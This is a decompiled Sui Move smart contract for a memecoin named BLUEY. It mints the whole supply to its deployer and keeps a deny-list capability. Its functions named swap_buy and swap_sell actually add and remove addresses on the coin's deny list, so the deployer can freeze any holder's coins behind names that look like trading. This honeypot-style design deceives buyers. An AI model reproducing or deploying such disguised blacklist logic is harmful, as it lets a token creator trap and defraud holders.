module 0xcc5e4ac98adec7139ed52410491d5708656a2aa2af7519da4a31770e36f9b53b::bluey {
    struct BLUEY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BLUEY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BLUEY>(arg0, 9, b"BLUEY", b"Bluey on SUI", x"426c756579206973206120626c7565206269726420636861726163746572206261736564206f6e207468652066616d6f757320636f6d696320626f6f6b20e2809c546865204e6967687420526964657273e2809d206279204d6174742046757269652c207468652068696464656e20616e696d616c206f7220636861726163746572206973206e616d656420426c7565792c206120626c7565206368617261637465722077686f206170706561727320737562746c792077697468696e2074686520696c6c757374726174696f6e732e205468697320636861726163746572206973206f6674656e20666f756e642073697474696e67206f6e20612074726565206272616e6368206f722068696464656e2077697468696e20746865206261636b67726f756e64206f6620746865207363656e65732e", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmbwcEG6MvSQE5mM2B7QrG6estabgL6r2HLSZkQ81v7P5c"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BLUEY>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BLUEY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BLUEY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BLUEY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BLUEY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BLUEY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BLUEY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BLUEY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

